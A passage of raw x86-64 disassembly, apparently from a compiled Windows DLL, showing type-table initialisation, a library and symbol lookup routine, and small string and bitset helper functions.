    6d8c4f39:	4c 8d 1d 4a d4 00 00 	lea    0xd44a(%rip),%r11        # 0x6d8d238a
    6d8c4f40:	4c 89 0d 11 71 0f 00 	mov    %r9,0xf7111(%rip)        # 0x6d9bc058
    6d8c4f47:	4c 8d 0d 45 d4 00 00 	lea    0xd445(%rip),%r9        # 0x6d8d2393
    6d8c4f4e:	4c 89 05 d3 70 0f 00 	mov    %r8,0xf70d3(%rip)        # 0x6d9bc028
    6d8c4f55:	4c 8d 05 a4 89 0f 00 	lea    0xf89a4(%rip),%r8        # 0x6d9bd900
    6d8c4f5c:	48 89 05 dd 25 10 00 	mov    %rax,0x1025dd(%rip)        # 0x6d9c7540
    6d8c4f63:	48 8d 05 b6 25 10 00 	lea    0x1025b6(%rip),%rax        # 0x6d9c7520
    6d8c4f6a:	4c 89 1d 77 72 0f 00 	mov    %r11,0xf7277(%rip)        # 0x6d9bc1e8
    6d8c4f71:	4c 89 05 98 72 0f 00 	mov    %r8,0xf7298(%rip)        # 0x6d9bc210
    6d8c4f78:	4c 89 0d 99 72 0f 00 	mov    %r9,0xf7299(%rip)        # 0x6d9bc218
    6d8c4f7f:	4c 89 15 aa 70 0f 00 	mov    %r10,0xf70aa(%rip)        # 0x6d9bc030
    6d8c4f86:	48 c7 05 a7 25 10 00 	movq   $0x0,0x1025a7(%rip)        # 0x6d9c7538
    6d8c4f8d:	00 00 00 00 
    6d8c4f91:	48 c7 05 84 25 10 00 	movq   $0x18,0x102584(%rip)        # 0x6d9c7520
    6d8c4f98:	18 00 00 00 
    6d8c4f9c:	48 c7 05 81 25 10 00 	movq   $0x8,0x102581(%rip)        # 0x6d9c7528
    6d8c4fa3:	08 00 00 00 
    6d8c4fa7:	66 c7 05 80 25 10 00 	movw   $0x112,0x102580(%rip)        # 0x6d9c7530
    6d8c4fae:	12 01 
    6d8c4fb0:	c6 05 19 72 0f 00 01 	movb   $0x1,0xf7219(%rip)        # 0x6d9bc1d0
    6d8c4fb7:	48 c7 05 16 72 0f 00 	movq   $0x0,0xf7216(%rip)        # 0x6d9bc1d8
    6d8c4fbe:	00 00 00 00 
    6d8c4fc2:	48 c7 05 4b 89 0f 00 	movq   $0x0,0xf894b(%rip)        # 0x6d9bd918
    6d8c4fc9:	00 00 00 00 
    6d8c4fcd:	48 c7 05 28 89 0f 00 	movq   $0x8,0xf8928(%rip)        # 0x6d9bd900
    6d8c4fd4:	08 00 00 00 
    6d8c4fd8:	48 c7 05 25 89 0f 00 	movq   $0x8,0xf8925(%rip)        # 0x6d9bd908
    6d8c4fdf:	08 00 00 00 
    6d8c4fe3:	66 c7 05 24 89 0f 00 	movw   $0x31f,0xf8924(%rip)        # 0x6d9bd910
    6d8c4fea:	1f 03 
    6d8c4fec:	c6 05 0d 72 0f 00 01 	movb   $0x1,0xf720d(%rip)        # 0x6d9bc200
    6d8c4ff3:	48 c7 05 0a 72 0f 00 	movq   $0x8,0xf720a(%rip)        # 0x6d9bc208
    6d8c4ffa:	08 00 00 00 
    6d8c4ffe:	c6 05 2b 72 0f 00 01 	movb   $0x1,0xf722b(%rip)        # 0x6d9bc230
    6d8c5005:	48 c7 05 28 72 0f 00 	movq   $0x10,0xf7228(%rip)        # 0x6d9bc238
    6d8c500c:	10 00 00 00 
    6d8c5010:	48 c7 05 a5 71 0f 00 	movq   $0x3,0xf71a5(%rip)        # 0x6d9bc1c0
    6d8c5017:	03 00 00 00 
    6d8c501b:	c6 05 7e 71 0f 00 02 	movb   $0x2,0xf717e(%rip)        # 0x6d9bc1a0
    6d8c5022:	48 c7 05 b3 24 10 00 	movq   $0x8,0x1024b3(%rip)        # 0x6d9c74e0
    6d8c5029:	08 00 00 00 
    6d8c502d:	48 c7 05 b0 24 10 00 	movq   $0x8,0x1024b0(%rip)        # 0x6d9c74e8
    6d8c5034:	08 00 00 00 
    6d8c5038:	c6 05 b1 24 10 00 18 	movb   $0x18,0x1024b1(%rip)        # 0x6d9c74f0
    6d8c503f:	48 89 05 b2 24 10 00 	mov    %rax,0x1024b2(%rip)        # 0x6d9c74f8
    6d8c5046:	48 8d 05 81 cb ff ff 	lea    -0x347f(%rip),%rax        # 0x6d8c1bce
    6d8c504d:	48 89 05 bc 24 10 00 	mov    %rax,0x1024bc(%rip)        # 0x6d9c7510
    6d8c5054:	48 8d 05 85 24 10 00 	lea    0x102485(%rip),%rax        # 0x6d9c74e0
    6d8c505b:	48 89 05 1e 71 0f 00 	mov    %rax,0xf711e(%rip)        # 0x6d9bc180
    6d8c5062:	48 8d 05 38 d3 00 00 	lea    0xd338(%rip),%rax        # 0x6d8d23a1
    6d8c5069:	48 89 05 18 71 0f 00 	mov    %rax,0xf7118(%rip)        # 0x6d9bc188
    6d8c5070:	49 8d 42 30          	lea    0x30(%r10),%rax
    6d8c5074:	48 89 05 e5 6f 0f 00 	mov    %rax,0xf6fe5(%rip)        # 0x6d9bc060
    6d8c507b:	48 8d 05 25 d3 00 00 	lea    0xd325(%rip),%rax        # 0x6d8d23a7
    6d8c5082:	48 89 05 ef 71 0f 00 	mov    %rax,0xf71ef(%rip)        # 0x6d9bc278
    6d8c5089:	48 8d 05 b0 6f 0f 00 	lea    0xf6fb0(%rip),%rax        # 0x6d9bc040
    6d8c5090:	48 89 05 41 70 0f 00 	mov    %rax,0xf7041(%rip)        # 0x6d9bc0d8
    6d8c5097:	49 8d 82 80 fe ff ff 	lea    -0x180(%r10),%rax
    6d8c509e:	48 89 05 7b 96 10 00 	mov    %rax,0x10967b(%rip)        # 0x6d9ce720
    6d8c50a5:	48 8d 05 0c e4 ff ff 	lea    -0x1bf4(%rip),%rax        # 0x6d8c34b8
    6d8c50ac:	48 89 05 bd 23 10 00 	mov    %rax,0x1023bd(%rip)        # 0x6d9c7470
    6d8c50b3:	49 8d 42 60          	lea    0x60(%r10),%rax
    6d8c50b7:	48 89 15 b2 71 0f 00 	mov    %rdx,0xf71b2(%rip)        # 0x6d9bc270
    6d8c50be:	48 8d 15 fb 95 10 00 	lea    0x1095fb(%rip),%rdx        # 0x6d9ce6c0
    6d8c50c5:	48 89 05 14 96 10 00 	mov    %rax,0x109614(%rip)        # 0x6d9ce6e0
    6d8c50cc:	49 8d 82 90 00 00 00 	lea    0x90(%r10),%rax
    6d8c50d3:	48 89 0d 7e 23 10 00 	mov    %rcx,0x10237e(%rip)        # 0x6d9c7458
    6d8c50da:	48 89 0d f7 95 10 00 	mov    %rcx,0x1095f7(%rip)        # 0x6d9ce6d8
    6d8c50e1:	48 89 15 30 27 10 00 	mov    %rdx,0x102730(%rip)        # 0x6d9c7818
    6d8c50e8:	c6 05 81 70 0f 00 01 	movb   $0x1,0xf7081(%rip)        # 0x6d9bc170
    6d8c50ef:	48 c7 05 7e 70 0f 00 	movq   $0x20,0xf707e(%rip)        # 0x6d9bc178
    6d8c50f6:	20 00 00 00 
    6d8c50fa:	c6 05 5f 71 0f 00 01 	movb   $0x1,0xf715f(%rip)        # 0x6d9bc260
    6d8c5101:	48 c7 05 5c 71 0f 00 	movq   $0x28,0xf715c(%rip)        # 0x6d9bc268
    6d8c5108:	28 00 00 00 
    6d8c510c:	48 c7 05 b9 6f 0f 00 	movq   $0x5,0xf6fb9(%rip)        # 0x6d9bc0d0
    6d8c5113:	05 00 00 00 
    6d8c5117:	c6 05 92 6f 0f 00 02 	movb   $0x2,0xf6f92(%rip)        # 0x6d9bc0b0
    6d8c511e:	48 c7 05 17 23 10 00 	movq   $0x8,0x102317(%rip)        # 0x6d9c7440
    6d8c5125:	08 00 00 00 
    6d8c5129:	48 c7 05 14 23 10 00 	movq   $0x8,0x102314(%rip)        # 0x6d9c7448
    6d8c5130:	08 00 00 00 
    6d8c5134:	c6 05 15 23 10 00 16 	movb   $0x16,0x102315(%rip)        # 0x6d9c7450
    6d8c513b:	48 c7 05 7a 95 10 00 	movq   $0x30,0x10957a(%rip)        # 0x6d9ce6c0
    6d8c5142:	30 00 00 00 
    6d8c5146:	48 c7 05 77 95 10 00 	movq   $0x8,0x109577(%rip)        # 0x6d9ce6c8
    6d8c514d:	08 00 00 00 
    6d8c5151:	c6 05 78 95 10 00 11 	movb   $0x11,0x109578(%rip)        # 0x6d9ce6d0
    6d8c5158:	48 c7 05 4d 71 0f 00 	movq   $0x0,0xf714d(%rip)        # 0x6d9bc2b0
    6d8c515f:	00 00 00 00 
    6d8c5163:	c6 05 26 71 0f 00 02 	movb   $0x2,0xf7126(%rip)        # 0x6d9bc290
    6d8c516a:	48 c7 05 8b 26 10 00 	movq   $0x30,0x10268b(%rip)        # 0x6d9c7800
    6d8c5171:	30 00 00 00 
    6d8c5175:	48 c7 05 88 26 10 00 	movq   $0x8,0x102688(%rip)        # 0x6d9c7808
    6d8c517c:	08 00 00 00 
    6d8c5180:	c6 05 89 26 10 00 11 	movb   $0x11,0x102689(%rip)        # 0x6d9c7810
    6d8c5187:	48 c7 05 4e 71 0f 00 	movq   $0x0,0xf714e(%rip)        # 0x6d9bc2e0
    6d8c518e:	00 00 00 00 
    6d8c5192:	c6 05 27 71 0f 00 02 	movb   $0x2,0xf7127(%rip)        # 0x6d9bc2c0
    6d8c5199:	48 89 05 80 26 10 00 	mov    %rax,0x102680(%rip)        # 0x6d9c7820
    6d8c51a0:	48 8d 05 59 26 10 00 	lea    0x102659(%rip),%rax        # 0x6d9c7800
    6d8c51a7:	48 89 05 aa 24 10 00 	mov    %rax,0x1024aa(%rip)        # 0x6d9c7658
    6d8c51ae:	48 8d 05 c5 e2 ff ff 	lea    -0x1d3b(%rip),%rax        # 0x6d8c347a
    6d8c51b5:	48 89 05 b4 24 10 00 	mov    %rax,0x1024b4(%rip)        # 0x6d9c7670
    6d8c51bc:	49 8d 82 c0 00 00 00 	lea    0xc0(%r10),%rax
    6d8c51c3:	48 89 05 f6 21 10 00 	mov    %rax,0x1021f6(%rip)        # 0x6d9c73c0
    6d8c51ca:	48 8d 05 cf 21 10 00 	lea    0x1021cf(%rip),%rax        # 0x6d9c73a0
    6d8c51d1:	48 89 05 e0 22 10 00 	mov    %rax,0x1022e0(%rip)        # 0x6d9c74b8
    6d8c51d8:	49 8d 82 f0 00 00 00 	lea    0xf0(%r10),%rax
    6d8c51df:	48 89 05 da 22 10 00 	mov    %rax,0x1022da(%rip)        # 0x6d9c74c0
    6d8c51e6:	48 8d 05 b3 22 10 00 	lea    0x1022b3(%rip),%rax        # 0x6d9c74a0
    6d8c51ed:	48 89 05 04 22 10 00 	mov    %rax,0x102204(%rip)        # 0x6d9c73f8
    6d8c51f4:	48 8d 05 41 e2 ff ff 	lea    -0x1dbf(%rip),%rax        # 0x6d8c343c
    6d8c51fb:	48 89 0d 96 24 10 00 	mov    %rcx,0x102496(%rip)        # 0x6d9c7698
    6d8c5202:	49 8d 8a 20 01 00 00 	lea    0x120(%r10),%rcx
    6d8c5209:	48 89 15 a8 21 10 00 	mov    %rdx,0x1021a8(%rip)        # 0x6d9c73b8
    6d8c5210:	48 89 05 f9 21 10 00 	mov    %rax,0x1021f9(%rip)        # 0x6d9c7410
    6d8c5217:	48 8d 05 62 24 10 00 	lea    0x102462(%rip),%rax        # 0x6d9c7680
    6d8c521e:	48 c7 05 17 24 10 00 	movq   $0x8,0x102417(%rip)        # 0x6d9c7640
    6d8c5225:	08 00 00 00 
    6d8c5229:	48 c7 05 14 24 10 00 	movq   $0x8,0x102414(%rip)        # 0x6d9c7648
    6d8c5230:	08 00 00 00 
    6d8c5234:	c6 05 15 24 10 00 16 	movb   $0x16,0x102415(%rip)        # 0x6d9c7650
    6d8c523b:	48 c7 05 5a 21 10 00 	movq   $0x30,0x10215a(%rip)        # 0x6d9c73a0
    6d8c5242:	30 00 00 00 
    6d8c5246:	48 c7 05 57 21 10 00 	movq   $0x8,0x102157(%rip)        # 0x6d9c73a8
    6d8c524d:	08 00 00 00 
    6d8c5251:	c6 05 58 21 10 00 11 	movb   $0x11,0x102158(%rip)        # 0x6d9c73b0
    6d8c5258:	48 c7 05 ad 70 0f 00 	movq   $0x0,0xf70ad(%rip)        # 0x6d9bc310
    6d8c525f:	00 00 00 00 
    6d8c5263:	c6 05 86 70 0f 00 02 	movb   $0x2,0xf7086(%rip)        # 0x6d9bc2f0
    6d8c526a:	48 c7 05 2b 22 10 00 	movq   $0x30,0x10222b(%rip)        # 0x6d9c74a0
    6d8c5271:	30 00 00 00 
    6d8c5275:	48 c7 05 28 22 10 00 	movq   $0x8,0x102228(%rip)        # 0x6d9c74a8
    6d8c527c:	08 00 00 00 
    6d8c5280:	c6 05 29 22 10 00 11 	movb   $0x11,0x102229(%rip)        # 0x6d9c74b0
    6d8c5287:	48 c7 05 ae 70 0f 00 	movq   $0x0,0xf70ae(%rip)        # 0x6d9bc340
    6d8c528e:	00 00 00 00 
    6d8c5292:	c6 05 87 70 0f 00 02 	movb   $0x2,0xf7087(%rip)        # 0x6d9bc320
    6d8c5299:	48 c7 05 3c 21 10 00 	movq   $0x8,0x10213c(%rip)        # 0x6d9c73e0
    6d8c52a0:	08 00 00 00 
    6d8c52a4:	48 c7 05 39 21 10 00 	movq   $0x8,0x102139(%rip)        # 0x6d9c73e8
    6d8c52ab:	08 00 00 00 
    6d8c52af:	c6 05 3a 21 10 00 16 	movb   $0x16,0x10213a(%rip)        # 0x6d9c73f0
    6d8c52b6:	48 c7 05 d7 93 10 00 	movq   $0x0,0x1093d7(%rip)        # 0x6d9ce698
    6d8c52bd:	00 00 00 00 
    6d8c52c1:	48 c7 05 b4 93 10 00 	movq   $0x4,0x1093b4(%rip)        # 0x6d9ce680
    6d8c52c8:	04 00 00 00 
    6d8c52cc:	48 c7 05 b1 93 10 00 	movq   $0x4,0x1093b1(%rip)        # 0x6d9ce688
    6d8c52d3:	04 00 00 00 
    6d8c52d7:	66 c7 05 b0 93 10 00 	movw   $0x32b,0x1093b0(%rip)        # 0x6d9ce690
    6d8c52de:	2b 03 
    6d8c52e0:	48 c7 05 95 23 10 00 	movq   $0x30,0x102395(%rip)        # 0x6d9c7680
    6d8c52e7:	30 00 00 00 
    6d8c52eb:	48 c7 05 92 23 10 00 	movq   $0x8,0x102392(%rip)        # 0x6d9c7688
    6d8c52f2:	08 00 00 00 
    6d8c52f6:	c6 05 93 23 10 00 11 	movb   $0x11,0x102393(%rip)        # 0x6d9c7690
    6d8c52fd:	48 c7 05 68 70 0f 00 	movq   $0x0,0xf7068(%rip)        # 0x6d9bc370
    6d8c5304:	00 00 00 00 
    6d8c5308:	48 89 0d 91 23 10 00 	mov    %rcx,0x102391(%rip)        # 0x6d9c76a0
    6d8c530f:	49 8d 8a 50 01 00 00 	lea    0x150(%r10),%rcx
    6d8c5316:	48 89 0d 43 94 10 00 	mov    %rcx,0x109443(%rip)        # 0x6d9ce760
    6d8c531d:	48 8d 0d 1c 94 10 00 	lea    0x10941c(%rip),%rcx        # 0x6d9ce740
    6d8c5324:	48 89 0d 6d 22 10 00 	mov    %rcx,0x10226d(%rip)        # 0x6d9c7598
    6d8c532b:	48 8d 0d cc e0 ff ff 	lea    -0x1f34(%rip),%rcx        # 0x6d8c33fe
    6d8c5332:	48 89 0d 77 22 10 00 	mov    %rcx,0x102277(%rip)        # 0x6d9c75b0
    6d8c5339:	49 8d 8a 80 01 00 00 	lea    0x180(%r10),%rcx
    6d8c5340:	48 89 0d 79 24 10 00 	mov    %rcx,0x102479(%rip)        # 0x6d9c77c0
    6d8c5347:	48 8d 0d 52 24 10 00 	lea    0x102452(%rip),%rcx        # 0x6d9c77a0
    6d8c534e:	48 89 0d 83 94 10 00 	mov    %rcx,0x109483(%rip)        # 0x6d9ce7d8
    6d8c5355:	48 8d 0d 64 e0 ff ff 	lea    -0x1f9c(%rip),%rcx        # 0x6d8c33c0
    6d8c535c:	48 89 05 f5 93 10 00 	mov    %rax,0x1093f5(%rip)        # 0x6d9ce758
    6d8c5363:	48 89 05 4e 24 10 00 	mov    %rax,0x10244e(%rip)        # 0x6d9c77b8
    6d8c536a:	48 89 0d 7f 94 10 00 	mov    %rcx,0x10947f(%rip)        # 0x6d9ce7f0
    6d8c5371:	c6 05 d8 6f 0f 00 02 	movb   $0x2,0xf6fd8(%rip)        # 0x6d9bc350
    6d8c5378:	48 c7 05 bd 93 10 00 	movq   $0x30,0x1093bd(%rip)        # 0x6d9ce740
    6d8c537f:	30 00 00 00 
    6d8c5383:	48 c7 05 ba 93 10 00 	movq   $0x8,0x1093ba(%rip)        # 0x6d9ce748
    6d8c538a:	08 00 00 00 
    6d8c538e:	c6 05 bb 93 10 00 11 	movb   $0x11,0x1093bb(%rip)        # 0x6d9ce750
    6d8c5395:	48 c7 05 00 70 0f 00 	movq   $0x0,0xf7000(%rip)        # 0x6d9bc3a0
    6d8c539c:	00 00 00 00 
    6d8c53a0:	c6 05 d9 6f 0f 00 02 	movb   $0x2,0xf6fd9(%rip)        # 0x6d9bc380
    6d8c53a7:	48 c7 05 ce 21 10 00 	movq   $0x8,0x1021ce(%rip)        # 0x6d9c7580
    6d8c53ae:	08 00 00 00 
    6d8c53b2:	48 c7 05 cb 21 10 00 	movq   $0x8,0x1021cb(%rip)        # 0x6d9c7588
    6d8c53b9:	08 00 00 00 
    6d8c53bd:	c6 05 cc 21 10 00 16 	movb   $0x16,0x1021cc(%rip)        # 0x6d9c7590
    6d8c53c4:	48 c7 05 89 f3 0f 00 	movq   $0x0,0xff389(%rip)        # 0x6d9c4758
    6d8c53cb:	00 00 00 00 
    6d8c53cf:	48 c7 05 66 f3 0f 00 	movq   $0x1,0xff366(%rip)        # 0x6d9c4740
    6d8c53d6:	01 00 00 00 
    6d8c53da:	48 c7 05 63 f3 0f 00 	movq   $0x1,0xff363(%rip)        # 0x6d9c4748
    6d8c53e1:	01 00 00 00 
    6d8c53e5:	66 c7 05 62 f3 0f 00 	movw   $0x329,0xff362(%rip)        # 0x6d9c4750
    6d8c53ec:	29 03 
    6d8c53ee:	48 c7 05 a7 23 10 00 	movq   $0x30,0x1023a7(%rip)        # 0x6d9c77a0
    6d8c53f5:	30 00 00 00 
    6d8c53f9:	48 c7 05 a4 23 10 00 	movq   $0x8,0x1023a4(%rip)        # 0x6d9c77a8
    6d8c5400:	08 00 00 00 
    6d8c5404:	c6 05 a5 23 10 00 11 	movb   $0x11,0x1023a5(%rip)        # 0x6d9c77b0
    6d8c540b:	48 c7 05 ba 6f 0f 00 	movq   $0x0,0xf6fba(%rip)        # 0x6d9bc3d0
    6d8c5412:	00 00 00 00 
    6d8c5416:	c6 05 93 6f 0f 00 02 	movb   $0x2,0xf6f93(%rip)        # 0x6d9bc3b0
    6d8c541d:	48 c7 05 98 93 10 00 	movq   $0x8,0x109398(%rip)        # 0x6d9ce7c0
    6d8c5424:	08 00 00 00 
    6d8c5428:	48 c7 05 95 93 10 00 	movq   $0x8,0x109395(%rip)        # 0x6d9ce7c8
    6d8c542f:	08 00 00 00 
    6d8c5433:	c6 05 96 93 10 00 16 	movb   $0x16,0x109396(%rip)        # 0x6d9ce7d0
    6d8c543a:	48 c7 05 1b 85 0f 00 	movq   $0x30,0xf851b(%rip)        # 0x6d9bd960
    6d8c5441:	30 00 00 00 
    6d8c5445:	48 c7 05 18 85 0f 00 	movq   $0x8,0xf8518(%rip)        # 0x6d9bd968
    6d8c544c:	08 00 00 00 
    6d8c5450:	c6 05 19 85 0f 00 11 	movb   $0x11,0xf8519(%rip)        # 0x6d9bd970
    6d8c5457:	48 89 05 1a 23 10 00 	mov    %rax,0x10231a(%rip)        # 0x6d9c7778
    6d8c545e:	48 8d 05 7b 91 10 00 	lea    0x10917b(%rip),%rax        # 0x6d9ce5e0
    6d8c5465:	48 89 15 0c 85 0f 00 	mov    %rdx,0xf850c(%rip)        # 0x6d9bd978
    6d8c546c:	49 8d 92 b0 01 00 00 	lea    0x1b0(%r10),%rdx
    6d8c5473:	48 89 05 a6 6f 0f 00 	mov    %rax,0xf6fa6(%rip)        # 0x6d9bc420
    6d8c547a:	48 8d 05 29 cf 00 00 	lea    0xcf29(%rip),%rax        # 0x6d8d23aa
    6d8c5481:	48 89 15 f8 84 0f 00 	mov    %rdx,0xf84f8(%rip)        # 0x6d9bd980
    6d8c5488:	48 8d 15 d1 84 0f 00 	lea    0xf84d1(%rip),%rdx        # 0x6d9bd960
    6d8c548f:	48 89 05 92 6f 0f 00 	mov    %rax,0xf6f92(%rip)        # 0x6d9bc428
    6d8c5496:	49 8d 82 e0 01 00 00 	lea    0x1e0(%r10),%rax
    6d8c549d:	48 89 15 54 21 10 00 	mov    %rdx,0x102154(%rip)        # 0x6d9c75f8
    6d8c54a4:	48 8d 15 d7 de ff ff 	lea    -0x2129(%rip),%rdx        # 0x6d8c3382
    6d8c54ab:	48 89 05 ce 22 10 00 	mov    %rax,0x1022ce(%rip)        # 0x6d9c7780
    6d8c54b2:	48 8d 05 a7 22 10 00 	lea    0x1022a7(%rip),%rax        # 0x6d9c7760
    6d8c54b9:	48 89 15 50 21 10 00 	mov    %rdx,0x102150(%rip)        # 0x6d9c7610
    6d8c54c0:	48 c7 05 35 6f 0f 00 	movq   $0x0,0xf6f35(%rip)        # 0x6d9bc400
    6d8c54c7:	00 00 00 00 
    6d8c54cb:	c6 05 0e 6f 0f 00 02 	movb   $0x2,0xf6f0e(%rip)        # 0x6d9bc3e0
    6d8c54d2:	48 c7 05 03 21 10 00 	movq   $0x8,0x102103(%rip)        # 0x6d9c75e0
    6d8c54d9:	08 00 00 00 
    6d8c54dd:	48 c7 05 00 21 10 00 	movq   $0x8,0x102100(%rip)        # 0x6d9c75e8
    6d8c54e4:	08 00 00 00 
    6d8c54e8:	c6 05 01 21 10 00 16 	movb   $0x16,0x102101(%rip)        # 0x6d9c75f0
    6d8c54ef:	48 c7 05 de 21 10 00 	movq   $0x0,0x1021de(%rip)        # 0x6d9c76d8
    6d8c54f6:	00 00 00 00 
    6d8c54fa:	48 c7 05 bb 21 10 00 	movq   $0x4,0x1021bb(%rip)        # 0x6d9c76c0
    6d8c5501:	04 00 00 00 
    6d8c5505:	48 c7 05 b8 21 10 00 	movq   $0x4,0x1021b8(%rip)        # 0x6d9c76c8
    6d8c550c:	04 00 00 00 
    6d8c5510:	66 c7 05 b7 21 10 00 	movw   $0x322,0x1021b7(%rip)        # 0x6d9c76d0
    6d8c5517:	22 03 
    6d8c5519:	48 c7 05 14 91 10 00 	movq   $0x0,0x109114(%rip)        # 0x6d9ce638
    6d8c5520:	00 00 00 00 
    6d8c5524:	48 c7 05 f1 90 10 00 	movq   $0x1,0x1090f1(%rip)        # 0x6d9ce620
    6d8c552b:	01 00 00 00 
    6d8c552f:	48 c7 05 ee 90 10 00 	movq   $0x1,0x1090ee(%rip)        # 0x6d9ce628
    6d8c5536:	01 00 00 00 
    6d8c553a:	66 c7 05 ed 90 10 00 	movw   $0x301,0x1090ed(%rip)        # 0x6d9ce630
    6d8c5541:	01 03 
    6d8c5543:	48 c7 05 12 22 10 00 	movq   $0x38,0x102212(%rip)        # 0x6d9c7760
    6d8c554a:	38 00 00 00 
    6d8c554e:	48 c7 05 0f 22 10 00 	movq   $0x8,0x10220f(%rip)        # 0x6d9c7768
    6d8c5555:	08 00 00 00 
    6d8c5559:	c6 05 10 22 10 00 11 	movb   $0x11,0x102210(%rip)        # 0x6d9c7770
    6d8c5560:	48 c7 05 8d 90 10 00 	movq   $0x0,0x10908d(%rip)        # 0x6d9ce5f8
    6d8c5567:	00 00 00 00 
    6d8c556b:	48 c7 05 6a 90 10 00 	movq   $0x4,0x10906a(%rip)        # 0x6d9ce5e0
    6d8c5572:	04 00 00 00 
    6d8c5576:	48 c7 05 67 90 10 00 	movq   $0x4,0x109067(%rip)        # 0x6d9ce5e8
    6d8c557d:	04 00 00 00 
    6d8c5581:	66 c7 05 66 90 10 00 	movw   $0x322,0x109066(%rip)        # 0x6d9ce5f0
    6d8c5588:	22 03 
    6d8c558a:	c6 05 7f 6e 0f 00 01 	movb   $0x1,0xf6e7f(%rip)        # 0x6d9bc410
    6d8c5591:	48 c7 05 7c 6e 0f 00 	movq   $0x30,0xf6e7c(%rip)        # 0x6d9bc418
    6d8c5598:	30 00 00 00 
    6d8c559c:	48 c7 05 d9 91 10 00 	movq   $0x8,0x1091d9(%rip)        # 0x6d9ce780
    6d8c55a3:	08 00 00 00 
    6d8c55a7:	48 c7 05 d6 91 10 00 	movq   $0x8,0x1091d6(%rip)        # 0x6d9ce788
    6d8c55ae:	08 00 00 00 
    6d8c55b2:	c6 05 d7 91 10 00 16 	movb   $0x16,0x1091d7(%rip)        # 0x6d9ce790
    6d8c55b9:	48 89 05 d8 91 10 00 	mov    %rax,0x1091d8(%rip)        # 0x6d9ce798
    6d8c55c0:	48 8d 05 7d dd ff ff 	lea    -0x2283(%rip),%rax        # 0x6d8c3344
    6d8c55c7:	48 89 05 e2 91 10 00 	mov    %rax,0x1091e2(%rip)        # 0x6d9ce7b0
    6d8c55ce:	48 c7 05 3f 21 10 00 	movq   $0x0,0x10213f(%rip)        # 0x6d9c7718
    6d8c55d5:	00 00 00 00 
    6d8c55d9:	48 c7 05 1c 21 10 00 	movq   $0x2,0x10211c(%rip)        # 0x6d9c7700
    6d8c55e0:	02 00 00 00 
    6d8c55e4:	48 c7 05 19 21 10 00 	movq   $0x2,0x102119(%rip)        # 0x6d9c7708
    6d8c55eb:	02 00 00 00 
    6d8c55ef:	66 c7 05 18 21 10 00 	movw   $0x321,0x102118(%rip)        # 0x6d9c7710
    6d8c55f6:	21 03 
    6d8c55f8:	c3                   	ret
    6d8c55f9:	90                   	nop
    6d8c55fa:	90                   	nop
    6d8c55fb:	90                   	nop
    6d8c55fc:	90                   	nop
    6d8c55fd:	90                   	nop
    6d8c55fe:	90                   	nop
    6d8c55ff:	90                   	nop
    6d8c5600:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c5604:	48 8d 0d 35 d0 00 00 	lea    0xd035(%rip),%rcx        # 0x6d8d2640
    6d8c560b:	e8 47 f4 ff ff       	call   0x6d8c4a57
    6d8c5610:	48 85 c0             	test   %rax,%rax
    6d8c5613:	48 89 05 26 6e 0f 00 	mov    %rax,0xf6e26(%rip)        # 0x6d9bc440
    6d8c561a:	75 0c                	jne    0x6d8c5628
    6d8c561c:	48 8d 0d fd cf 00 00 	lea    0xcffd(%rip),%rcx        # 0x6d8d2620
    6d8c5623:	e8 46 f4 ff ff       	call   0x6d8c4a6e
    6d8c5628:	48 8b 0d 11 6e 0f 00 	mov    0xf6e11(%rip),%rcx        # 0x6d9bc440
    6d8c562f:	48 8d 15 ca cf 00 00 	lea    0xcfca(%rip),%rdx        # 0x6d8d2600
    6d8c5636:	e8 13 f5 ff ff       	call   0x6d8c4b4e
    6d8c563b:	48 89 05 be 91 10 00 	mov    %rax,0x1091be(%rip)        # 0x6d9ce800
    6d8c5642:	48 83 c4 28          	add    $0x28,%rsp
    6d8c5646:	c3                   	ret
    6d8c5647:	90                   	nop
    6d8c5648:	90                   	nop
    6d8c5649:	90                   	nop
    6d8c564a:	90                   	nop
    6d8c564b:	90                   	nop
    6d8c564c:	90                   	nop
    6d8c564d:	90                   	nop
    6d8c564e:	90                   	nop
    6d8c564f:	90                   	nop
    6d8c5650:	85 c9                	test   %ecx,%ecx
    6d8c5652:	0f 95 c0             	setne  %al
    6d8c5655:	c3                   	ret
    6d8c5656:	0f b6 c1             	movzbl %cl,%eax
    6d8c5659:	c3                   	ret
    6d8c565a:	90                   	nop
    6d8c565b:	90                   	nop
    6d8c565c:	90                   	nop
    6d8c565d:	90                   	nop
    6d8c565e:	90                   	nop
    6d8c565f:	90                   	nop
    6d8c5660:	57                   	push   %rdi
    6d8c5661:	56                   	push   %rsi
    6d8c5662:	48 85 d2             	test   %rdx,%rdx
    6d8c5665:	48 89 c8             	mov    %rcx,%rax
    6d8c5668:	74 1e                	je     0x6d8c5688
    6d8c566a:	48 8b 09             	mov    (%rcx),%rcx
    6d8c566d:	48 8d 72 10          	lea    0x10(%rdx),%rsi
    6d8c5671:	48 8b 3a             	mov    (%rdx),%rdi
    6d8c5674:	4c 8d 44 08 10       	lea    0x10(%rax,%rcx,1),%r8
    6d8c5679:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
    6d8c567d:	4c 89 c7             	mov    %r8,%rdi
    6d8c5680:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8c5682:	48 8b 12             	mov    (%rdx),%rdx
    6d8c5685:	48 01 10             	add    %rdx,(%rax)
    6d8c5688:	5e                   	pop    %rsi
    6d8c5689:	5f                   	pop    %rdi
    6d8c568a:	c3                   	ret
    6d8c568b:	4d 85 c9             	test   %r9,%r9
    6d8c568e:	75 0f                	jne    0x6d8c569f
    6d8c5690:	49 83 c9 ff          	or     $0xffffffffffffffff,%r9
    6d8c5694:	48 85 c9             	test   %rcx,%rcx
    6d8c5697:	74 06                	je     0x6d8c569f
    6d8c5699:	48 8b 01             	mov    (%rcx),%rax
    6d8c569c:	49 01 c1             	add    %rax,%r9
    6d8c569f:	4c 89 c0             	mov    %r8,%rax
    6d8c56a2:	49 39 c1             	cmp    %rax,%r9
    6d8c56a5:	7c 24                	jl     0x6d8c56cb
    6d8c56a7:	44 8a 44 01 10       	mov    0x10(%rcx,%rax,1),%r8b
    6d8c56ac:	45 89 c2             	mov    %r8d,%r10d
    6d8c56af:	41 83 e0 07          	and    $0x7,%r8d
    6d8c56b3:	41 c0 ea 03          	shr    $0x3,%r10b
    6d8c56b7:	45 0f b6 d2          	movzbl %r10b,%r10d
    6d8c56bb:	46 0f b6 14 12       	movzbl (%rdx,%r10,1),%r10d
    6d8c56c0:	45 0f a3 c2          	bt     %r8d,%r10d
    6d8c56c4:	72 09                	jb     0x6d8c56cf
    6d8c56c6:	48 ff c0             	inc    %rax
